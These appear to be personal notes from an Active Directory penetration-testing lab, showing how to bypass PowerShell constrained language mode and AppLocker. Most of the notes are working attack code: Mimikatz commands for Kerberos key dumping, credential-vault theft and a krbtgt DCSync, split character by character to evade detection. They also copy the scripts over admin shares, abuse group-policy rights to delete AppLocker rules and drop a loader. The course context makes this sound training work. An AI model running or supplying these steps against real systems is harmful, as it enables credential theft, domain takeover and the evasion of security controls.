View constrained language type
```powershell
$ExecutionContext.SessionState.LanguageMode
```

View Policy
```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

Default rules are to allow **Everyone** to access and run scripts from `C:\Program Files` and `C:\Windows`
![[Pasted image 20250506212949.png]]

In the `Constrained Language Mode`, we can't run scripts using dot sourcing (`. .\Invoke-Mimi.ps1`). So, we must modify `Invoke-Mimi.ps1 `to include the 
function call in the script itself and transfer the modified script (`Invoke-MimiEx.ps1`) to the target server.

Create `Invoke-MimiEx-keys.ps1`
- Create a copy of Invoke-Mimi.ps1 and rename it to `Invoke-MimiEx-keys.ps1`
- Open `Invoke-MimiEx-keys.ps1 `in PowerShell ISE (Right click on it and click Edit). 
- Add the below encoded value for "sekurlsa::ekeys" to the end of the file

```powershell
$8 = "s";
$c = "e";
$g = "k";
$t = "u";
$p = "r";
$n = "l";
$7 = "s";
$6 = "a";
$l = ":";
$2 = ":";
$z = "e";
$e = "k";
$0 = "e";
$s = "y";
$1 = "s";
$Pwn = $8 + $c + $g + $t + $p + $n + $7 + $6 + $l + $2 + $z + $e + $0 + $s + 
$1 ;
Invoke-Mimi -Command $Pwn
```

Same thing for Credential Vault
```powershell
$8 = "t"; $c = "o"; $g = "k"; $t = "e"; $p = "n"; $n = ":"; $7 = ":"; $6 = "e"; $l = "l"; $2 = "e"; $z = "v"; $e = "a"; $0 = "t"; $s = "e";
$cmd1 = $8 + $c + $g + $t + $p + $n + $7 + $6 + $l + $2 + $z + $e + $0 + $s;

$v1 = "v"; $v2 = "a"; $v3 = "u"; $v4 = "l"; $v5 = "t"; $v6 = ":"; $v7 = ":"; $v8 = "c"; $v9 = "r"; $v10 = "e"; $v11 = "d";
$v12 = " "; $v13 = "/"; $v14 = "p"; $v15 = "a"; $v16 = "t"; $v17 = "c"; $v18 = "h"; $v19 = '"';
$cmd2 = $v19 + $v1 + $v2 + $v3 + $v4 + $v5 + $v6 + $v7 + $v8 + $v9 + $v10 + $v11 + $v12 + $v13 + $v14 + $v15 + $v16 + $v17 + $v18 + $v19;

# Concatenate both commands into a single string
$Pwn = $cmd1 + " " + $cmd2

# Run it
Invoke-Mimi -Command $Pwn

```

```powershell
# Build 'lsadump::dcsync'
$a1 = "l"; $a2 = "s"; $a3 = "a"; $a4 = "d"; $a5 = "u"; $a6 = "m"; $a7 = "p";
$a8 = ":"; $a9 = ":"; $a10 = "d"; $a11 = "c"; $a12 = "s"; $a13 = "y"; $a14 = "n"; $a15 = "c";
$cmd1 = $a1 + $a2 + $a3 + $a4 + $a5 + $a6 + $a7 + $a8 + $a9 + $a10 + $a11 + $a12 + $a13 + $a14 + $a15;

# Build '/user:TECH\krbtgt'
$b1 = "/"; $b2 = "u"; $b3 = "s"; $b4 = "e"; $b5 = "r"; $b6 = ":"; 
$b7 = "T"; $b8 = "E"; $b9 = "C"; $b10 = "H"; $b11 = "\"; 
$b12 = "k"; $b13 = "r"; $b14 = "b"; $b15 = "t"; $b16 = "g"; $b17 = "t";
$cmd2 = " " + $b1 + $b2 + $b3 + $b4 + $b5 + $b6 + $b7 + $b8 + $b9 + $b10 + $b11 + $b12 + $b13 + $b14 + $b15 + $b16 + $b17;

# Combine and execute
$Pwn = $cmd1 + $cmd2
Invoke-Mimi -Command $Pwn
```

Copy to machine and run
```powershell
Copy-Item C:\AD\Tools\Invoke-MimiEx-keys.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'

Copy-Item C:\AD\Tools\Invoke-MimiEx-vault.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'

.\Invoke-MimiEx-keys.ps1
.\Invoke-MimiEx-vault.ps1
```

### Generic All over AppLocker Policy
**This policy must apply to the machine**

Open CMD as user with rights
```powershell
runas /user:dcorp\srvadmin /netonly cmd
```

Open Group Policy editor
```powershell
gpmc.msc
```

Edit Policy
![[Pasted image 20250507064108.png]]

Policies -> Windows Settings -> Security Settings -> Application Control Policies -> AppLocker

Executable rules, delete `Allow - Everyone - Signed by MS`


Force update on compromised machines
```powershell
gpupdate /force
```

```powershell
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-adminsrv\C$\Users\Public\Loader.exe
```

